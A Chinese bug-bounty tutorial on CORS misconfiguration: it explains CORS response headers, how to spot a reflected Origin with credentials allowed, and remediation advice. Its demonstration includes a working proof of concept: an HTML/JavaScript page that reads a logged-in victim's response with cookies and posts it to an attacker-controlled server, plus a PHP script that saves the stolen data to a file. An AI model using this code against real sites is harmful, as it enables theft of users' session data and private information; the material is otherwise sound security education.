# 原创
：  SRC实战 | CORS跨资源共享漏洞

# SRC实战 | CORS跨资源共享漏洞

### CORS跨资源共享

跨源资源共享 (CORS) 是一种浏览器机制，允许网页使用来自其他页面或域的资产和数据。<br/> 大多数站点需要使用资源和图像来运行它们的脚本。这些嵌入式资产存在安全风险，因为这些资产可能包含病毒或允许服务器访问黑客。

### CORS响应头

CORS通过在服务器端设置响应头来进行配置。当浏览器发起跨域请求时，服务器可以通过设置特定的CORS响应头来告知浏览器是否允许该请求。常见的CORS响应头包括以下几个：

Access-Control-Allow-Origin：指定允许访问该资源的源。可以是具体的源或通配符（*），表示允许来自任意源的访问。<br/> Access-Control-Allow-Methods：指定允许的HTTP方法（如GET、POST、PUT等）。<br/> Access-Control-Allow-Headers：指定允许的请求头字段。<br/> Access-Control-Allow-Credentials：指定是否允许发送身份凭证（如cookies、HTTP认证等）。<br/> Access-Control-Max-Age：指定预检请求（OPTIONS）的有效期，以减少对服务器的频繁请求。

### 寻找CORS漏洞

在数据包请求体中加入一个origin请求头

```
origin: http://xxxx.com

```

观察响应包，发现Origin可控，

```
Access-Control-Allow-Credentials: true
Access-Control-Allow-origin：http://xxxx.com

```

还没有验证referer，就说明可以劫持了。

### 实战原理

如果目标存在CORS跨资源共享漏洞，对方管理员在没有退出自己所管理的网站的情况下，点击恶意攻击者已经构造好的恶意网站，攻击者可以修改Origin字段为任意指定的值，实现绕过浏览器同源策略的限制，基于CORS漏洞发起恶意请求，实现对目标资源的恶意跨域访问，并读取服务器的响应结果，从而造成服务器的信息泄露。

### 实战演示

##### 发现cors

通过抓包抓到一个可以响应自己sessionid的请求体

<br/> 加入请求体origin：http://xxxx.com<br/> 观察响应体发现存在cors跨资源共享漏洞

##### 进行跨资源共享

1.html<br/> poc如下：

```
&lt;h1&gt;CORS test&lt;/h1&gt;</code>
`function loadXMLDoc()``{``    var xhr1;``    var xhr2;`
`    if(window.XMLHttpRequest)``    {``        xhr1 = new XMLHttpRequest();``        xhr2 = new XMLHttpRequest();``    }``    else``    {``        xhr1 = new ActiveXObject("Microsoft.XMLHTTP");``        xhr2= new ActiveXObject("Microsoft.XMLHTTP");``    }``    xhr1.onreadystatechange=function()``{``        if(xhr1.readyState == 4 &amp;amp;&amp;amp; xhr1.status == 200) //if receive xhr1 response``        {``            var datas=xhr1.responseText;``            xhr2.open("POST","http://要输入自己的炮台文件地址（需要公网ip）","true");``            alert('3');``            xhr2.setRequestHeader("Content-type","application/x-www-form-urlencoded;charset=utf-8");``            xhr2.send("T1="+escape(datas));      ``        }``    }``    xhr1.open("GET","https://要输入的存在cors漏洞的url地址","true") //request user page.``    alert(xhr1.responseText);``    xhr1.withCredentials = true;        //request with cookie``    xhr1.send();``}`<code>loadXMLDoc();
```

save.php<br/> poc如下：

```
&lt;?php</code>`$myfile = fopen("1.txt","w+") or die("Unable to open file!");``$txt = $_POST['T1'];``fwrite($myfile,$txt);``fclose($myfile);`<code>?&gt;
```

在没有退出目标网站的情况下去访问我们已经构造好的恶意网站http://xxxx.com/1.html<br/> 1.html会获取到响应体的内容并且把内容发给save.php,并且创建一个1.txt文件，把信息放到1.txt中

### 修复建议

1、正确配置跨域请求<br/> 如果Web资源包含敏感信息，则应在Access-Control-Allow-Origin标头中正确指定来源。<br/> 2、只允许信任的网站<br/> 3、避免将null列入白名单<br/> 避免使用标题Access-Control-Allow-Origin: null。

 申明：本账号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法。

###### **免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/direct/2f74894cf8e04b7f87d9716681f6e26b.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/direct/5b4209eac3784bd18f5e1cd6a5157e4e.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/direct/4a89b0c2a52a4f569a970e55dcbac0b4.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/direct/4f211474c8ab4a5a910884e1d3423310.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/direct/54c2816350ae4bf787d1c6eec0d4e837.png" width="665"/>

应急响应笔记

学习路线
